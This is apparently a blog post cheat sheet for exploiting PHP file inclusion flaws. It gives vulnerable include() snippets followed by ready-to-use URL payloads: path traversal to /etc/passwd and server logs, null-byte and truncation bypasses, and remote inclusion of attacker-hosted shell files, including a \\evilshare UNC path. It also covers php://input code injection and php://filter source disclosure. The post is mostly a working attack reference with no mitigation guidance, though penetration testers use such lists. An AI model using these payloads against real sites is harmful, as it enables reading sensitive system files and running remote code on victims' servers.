## Exploiting PHP File Inclusion – Overview

**Basic Local File Inclusion:**

<?php include("inc/" . $_GET['file']); ?>

-   Including files in the same directory:  
    _?file=.htaccess_
-   Path Traversal:  
    _?file=../../../../../../../../../var/lib/locate.db_  
    (this file is very interesting because it lets you search the filesystem, [other files](http://www.digininja.org/blog/when_all_you_can_do_is_read.php))
-   Including injected PHP code:  
    _?file=../../../../../../../../../var/log/apache/error.log_
    
    Tricks:
    
    -   list of possible [Apache dirs](http://wiki.apache.org/httpd/DistrosDefaultLayout)
    -   include access log from [file descriptor](http://pastebin.com/raw.php?i=cRYvK4jb) _/proc/self/fd/XX_
    -   include more info from the [proc file system](https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/)
    -   include [email log files](http://devels-playground.blogspot.com/2007/08/local-file-inclusion-tricks.html)
    -   include [ssh auth.log](http://www.coresec.org/2011/05/12/local-file-inclusion-to-remote-command-execution-using-ssh/)
    -   abuse avatar/image/attachment file uploads
    -   include [session files](http://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/)
    -   include PHP’s [temporarily uploaded files](http://gynvael.coldwind.pl/?id=376)
    -   If you additionally have a phpinfo() output, read [here](http://www.insomniasec.com/publications/LFI%20With%20PHPInfo%20Assistance.pdf).
    
    **Limited Local File Inclusion:**
    
    <?php include("inc/" . $_GET['file'] . ".htm"); ?>
    
    -   Null Byte Injection:  
        _?file=../../../../../../../../../etc/passwd%00_  
        (requires magic_quotes_gpc=off)
    -   Directory Listing with Null Byte Injection:  
        _?file=../../../../../../../../../var/www/accounts/%00_  
        (UFS filesystem only, requires magic_quotes_gpc=off, more details [here](https://websec.wordpress.com/2009/11/28/freebsd-directory-listing-with-php-file-functions/))
    -   Path Truncation:  
        _?file=../../../../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\.\.\ …_  
        (more details see [here](http://www.ush.it/2009/02/08/php-filesystem-attack-vectors/) and [here](http://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/))
    -   Dot Truncation:  
        _?file=../../../../../../../../../etc/passwd……………. …_  
        (Windows only, more details [here](http://www.notsosecure.com/folder2/2010/02/02/local-file-inclusion-with-magic_quotes_gpc-enabled/))
    -   Reverse Path Truncation:  
        _?file=../../../../ […] ../../../../../etc/passwd_  
        (more details [here](http://ptresearch.blogspot.com/2010/08/another-alternative-for-null-byte.html))
    
    **Basic Remote File Inclusion**
    
    <?php include($_GET['file']); ?>
    
    -   Including Remote Code:  
        _?file=[http|https|ftp]://websec.wordpress.com/shell.txt_  
        (requires allow_url_fopen=On and allow_url_include=On)
    -   Using PHP stream php://input:  
        _?file=php://input_  
        (specify your payload in the POST parameters, watch urlencoding, details [here](http://php.net/manual/en/wrappers.php.php), requires allow_url_include=On)
    -   Using PHP stream php://filter:  
        _?file=php://filter/convert.base64-encode/resource=index.php_  
        (lets you read PHP source because it wont get evaluated in base64. More details [here](http://diablohorn.wordpress.com/2010/01/16/interesting-local-file-inclusion-method/) and [here](http://php.net/manual/en/wrappers.php.php))
        
    -   Using data URIs:  
        _?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=_  
        (requires allow_url_include=On)
    -   Using XSS:  
        _?file=http://127.0.0.1/path/xss.php?xss=phpcode_  
        (makes sense if firewalled or only whitelisted domains allowed)
    
    **Limited Remote File Inclusion**
    
    <?php include($_GET['file'] . ".htm"); ?>
    
    -   _?file=https://websec.wordpress.com/shell_
    -   _?file=https://websec.wordpress.com/shell.txt?_
    -   _?file=https://websec.wordpress.com/shell.txt%23_
    
    (requires allow_url_fopen=On and allow_url_include=On)
    
    -   _?file=\\evilshare\shell.php_
    
    (bypasses allow_url_fopen=Off)
    
    **Static Remote File Inclusion:**
    
    <?php include("http://192.168.1.10/config.php"); ?>
    
    -   Man In The Middle  
        (lame indeed, but often forgotten)
    
    **Filter evasion**
    
    -   Access files with wildcards (read more [here](http://upshell.wordpress.com/2011/06/11/new-vulnerabilities-to-access-files-in-php/))
    
    Of course you can combine all the tricks. If you are aware of any other or interesting files to include please leave a comment and I’ll add them.